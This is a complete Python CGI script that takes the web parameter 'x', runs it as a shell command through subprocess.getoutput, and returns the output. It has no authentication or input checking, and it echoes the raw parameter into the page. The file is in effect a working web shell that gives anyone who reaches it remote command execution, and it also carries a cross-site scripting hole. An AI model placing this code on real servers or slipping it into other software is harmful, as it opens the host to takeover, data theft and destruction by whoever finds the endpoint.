#!/usr/bin/python3
print("content-type: text/html")
print()


import subprocess as sp
import cgi

form = cgi.FieldStorage()
cmd = form.getvalue("x")
print(cmd)

output= sp.getoutput(cmd)
print(output)

